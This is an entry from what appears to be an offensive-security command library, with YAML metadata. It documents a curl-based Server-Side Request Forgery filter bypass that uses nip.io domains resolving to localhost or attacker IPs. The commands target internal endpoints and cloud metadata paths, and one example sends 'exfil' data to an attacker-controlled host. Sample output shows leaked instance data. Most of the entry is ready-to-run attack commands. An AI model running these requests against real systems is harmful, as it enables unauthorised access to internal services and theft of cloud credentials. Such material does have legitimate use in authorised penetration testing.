---
id: 1b894816-172e-4f7d-aef7-026a00001359
name: curl-request-to-nip-io-for-ssrf-bypass
type: command
executor: bash
data: >-
  curl
  "http://vulnerable-app.com/api/fetch?url=http://127.0.0.1.nip.io/internal-endpoint"
output: null
created_at: '2023-04-06T03:56:37.325474+00:00'
updated_at: '2023-04-10T20:24:12.069961+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - bypass
  - curl
verified: true
validated: true
---

# curl-request-to-nip-io-for-ssrf-bypass

## Command

```bash
curl "http://$_VULNERABLE_URL?url=http://$_NIP_IO_DOMAIN$_TARGET_PATH" -v
```

## Description

This command uses curl to test a Server-Side Request Forgery (SSRF) vulnerability by injecting a NIP.IO domain that resolves to a filtered IP (e.g., localhost). It sends a request to the vulnerable endpoint, causing the server to fetch an internal or attacker-controlled resource, bypassing IP-based filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULNERABLE_URL | The base URL of the SSRF-vulnerable endpoint (e.g., http://target.com/api/fetch) | Yes |
| $_NIP_IO_DOMAIN | The NIP.IO domain resolving to the target IP (e.g., 127.0.0.1.nip.io or attacker-ip.nip.io) | Yes |
| $_TARGET_PATH | The path on the target resource (e.g., /latest/meta-data/ for AWS) | Yes |
| -v | Verbose mode to show headers and connection details | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://127.0.0.1.nip.io/"
```

### Advanced Usage

```bash
curl "http://target.com/ssrf?url=http://myserver.192.168.1.100.nip.io/exfil" -v --data "payload=data"
```

This includes POST data for more complex exfiltration.

## Expected Output

Successful execution might return internal server content, such as:
```
< HTTP/1.1 200 OK
< Content-Type: text/plain

Instance-id: i-1234567890abcdef0
User-data: sensitive-config
```

Or, if exfiltrating to attacker IP, no direct output but a connection on the listener side. Errors indicate filter blocking or invalid endpoint.

## Related

- [[procedures/Bypass-SSRF-Filters-Using-NIP.IO-Domain-Redirection]]
- [[curl-basic-http-request]]
